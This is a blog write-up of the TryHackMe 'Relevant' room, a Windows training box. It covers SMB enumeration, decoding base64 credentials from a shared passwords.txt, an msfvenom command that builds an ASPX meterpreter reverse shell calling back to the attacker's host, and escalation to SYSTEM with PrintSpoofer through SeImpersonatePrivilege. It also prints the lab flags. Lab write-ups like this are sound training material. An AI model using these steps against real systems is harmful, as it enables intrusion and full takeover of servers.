---
title: "Relevant Writeup THM"
description: "My writeup of the TryHackMe room [Relevant](https://tryhackme.com/room/relevant)"
date: 2024-01-01T13:00:00+01:00
image: https://images.unsplash.com/photo-1598662779094-110c2bad80b5?q=80&w=2146&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Windows
    - Privilege Escalation
categories:
    - Room
    - Medium
---

The first thing that I have done, using nmap:

```bash
nmap 10.10.91.208

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-31 06:18 EST
Nmap scan report for 10.10.91.208
Host is up (0.076s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 11.68 seconds
```

- 80: Web page
- 135: msrpc
- 139: NetBios
- 445: Samba
- 3389: rdp

From there I can see that the machine is running windows.

The interessing ports are 80 and 445.

First of all I am just going to explolre the web page.

From the web page we can see that it uses IIS as a web server, which can be really helpfull, but for now I am going to search other things, like, samba enumeration:

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.91.208

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-31 06:28 EST
Nmap scan report for 10.10.91.208
Host is up (0.067s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.91.208\ADMIN$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.91.208\C$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.91.208\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.91.208\nt4wrksv:
|     Type: STYPE_DISKTREE
|     Comment:
|     Anonymous access: <none>
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 36.80 seconds
```

Here I found out a shared folder called nt4wrksv, which can be a user.

And when I tried to enter this folder I was able to do that even without a password.

```bash
smbclient //10.10.91.208/nt4wrksv

Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Dec 31 06:28:38 2023
  ..                                  D        0  Sun Dec 31 06:28:38 2023
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 5136298 blocks available
```

I even found a passwords.txt file that I downloaded in my  machine to examine

```bash
cat passwords.txt

[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

There are two encoded passwords.

the first one is encoded in base64:

```bash
Bob - !P@$$W0rD!123
```

And it actually is username and password.

The second one is:

```bash
Bill - Juw4nnaM4n420696969!$$$
```

So, now we have two usernames with password.

Unfortunately they don’t work with the other samba folders.

So for now I am just going to switch target.

I tried using the rdp but even then I couldn’t enter.

So now I am going to try to enumerate the directories in the web page.

This didn’t go well.

So I went and searched for the version of IIS.

Using burp I intercepted the request and found this:

```bash
Server: Microsoft-IIS/10.0
```

So now that we know the version I am going to search online for some know vulnerabilities.

At this point it was clear that I was doing something wrong, so I went back and did another scan, this time with all the ports:

```bash
nmap -p- -A 10.10.161.53

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-31 07:22 EST
Nmap scan report for 10.10.161.53
Host is up (0.057s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2023-12-30T12:20:08
|_Not valid after:  2024-06-30T12:20:08
|_ssl-date: 2023-12-31T12:27:21+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2023-12-31T12:26:41+00:00
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h36m00s, deviation: 3h34m42s, median: -1s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-12-31T04:26:46-08:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-12-31T12:26:42
|_  start_date: 2023-12-31T12:20:09

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 265.81 seconds
```

And I got other 3 ports.

First thing that I am going to do is trying open the other web page:

Which is the same as the other.

Apart that this time I can enter the `nt4wrksv` directory that I have found in the samba share. (http://10.10.161.53:49663/nt4wrksv)

from the web page I can also access the passwords.txt file. (http://10.10.161.53:49663/nt4wrksv/passwords.txt)

And having the privilege to put file using smbclient I was able to open a reverse shell using:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=10.18.20.116 LPORT=4555 -f aspx -o rev.aspx
```

Putting it in the `nt4wrksv` shared folder, opening a listener inside metasploit, and navigate in that directory in the browser. (http://10.10.161.53:49663/nt4wrksv/rev.aspx)

So now I got a reverse shell.

```bash
getuid

Server username: IIS APPPOOL\DefaultAppPool
```

First of all I am going to retrieve the flag inside the Bob directory: `THM{fdk4ka34vk346ksxfr21tg789ktf45}`

Now that I am in I can see the privileges using `whoami /priv`.

I see that I the SeImpersonatePrivilege is Enabled. So I am going to exploit that.

I will do it using `PrintSpoofer64.exe.`

Which is a tool that can exploit this vulnerability.

```bash
PrintSpoofer64.exe -i -c powershell

[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

And just like that I retrieved the flag in the administrator desktop: `THM{1fk5kf469devly1gl320zafgl345pv}`

[Relevant Report](https://www.notion.so/Relevant-Report-abd044f35721485e867b54a754a2d63c?pvs=21)
